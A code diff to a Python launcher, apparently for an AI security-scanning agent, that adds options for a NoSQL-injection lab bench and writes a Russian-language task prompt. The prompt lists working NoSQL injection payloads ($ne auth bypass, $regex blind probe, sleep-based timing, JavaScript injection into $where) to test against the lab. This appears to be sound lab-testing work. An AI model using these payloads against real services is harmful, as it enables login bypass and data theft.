@@ -215,7 +215,13 @@ if __name__ == "__main__":
                         help="путь к исходникам SQLi Lab")
     parser.add_argument("--no-sqli-lab", action="store_true",
                         help="не проверять SQLi Lab")
-    
+    # ============ NoSQLi Lab ============
+    parser.add_argument("--nosqli-lab-url", default=None,
+                        help="URL NoSQLi Lab стенда")
+    parser.add_argument("--nosqli-source", default=None,
+                        help="путь к исходникам NoSQLi Lab")
+    parser.add_argument("--no-nosqli-lab", action="store_true",
+                        help="не проверять NoSQLi Lab")    
     # ============ произвольная задача ============
     parser.add_argument("--task", default=None,
                         help="произвольная задача (перекрывает остальное)")
@@ -231,6 +237,8 @@ if __name__ == "__main__":
         RULES_PATH = args.rules or os.getenv("RULES_PATH", "/app/rules/rules_semgrep.yaml")
         SQLI_LAB_URL = args.sqli_lab_url or os.getenv("SQLI_LAB_URL", "")
         SQLI_SOURCE_PATH = args.sqli_source or os.getenv("SQLI_SOURCE_PATH", "")
+        NOSQLI_LAB_URL = args.nosqli_lab_url or os.getenv("NOSQLI_LAB_URL", "")
+        NOSQLI_SOURCE_PATH = args.nosqli_source or os.getenv("NOSQLI_SOURCE_PATH", "")
         ZAP_URL = args.zap_url or os.getenv("ZAP_URL", "")
         ZAP_MODE = args.zap_mode
 
@@ -275,10 +283,27 @@ if __name__ == "__main__":
             if SQLI_SOURCE_PATH:
                 parts.append(f"Запусти Semgrep на {SQLI_SOURCE_PATH}.")
         
+        
+        # ============ NoSQLi Lab ============
+        if not args.no_nosqli_lab and NOSQLI_LAB_URL:
+            parts.append(
+                f"Проведи анализ NoSQLi на стенде {NOSQLI_LAB_URL}. "
+                f"Проверь эндпоинты: "
+                f"1) POST /api/login с payload "
+                f"{{\"username\":\"admin\",\"password\":{{\"$ne\":null}}}} (auth bypass); "
+                f"2) GET /api/check_user с payload "
+                f"?username=admin&password[$regex]=^S (blind boolean); "
+                f"3) GET /api/check_user_slow с payload "
+                f"?username=admin&where=sleep(3000)||true (blind time); "
+                f"4) GET /api/search с payload "
+                f"?q=1';return this.hidden// (JS-injection в $where)."
+            )
+            if NOSQLI_SOURCE_PATH:
+                parts.append(f"Запусти Semgrep на {NOSQLI_SOURCE_PATH}.")
+
         parts.append("Опиши найденные уязвимости с критичностью и рекомендациями.")
-
+        
         task = " ".join(parts)
-
      # ============ запуск ============
     print(f'{"=" * 30}\nЗАДАЧА ДЛЯ АГЕНТА:\n{task}\n{"=" * 30}')
     result = agent.invoke({
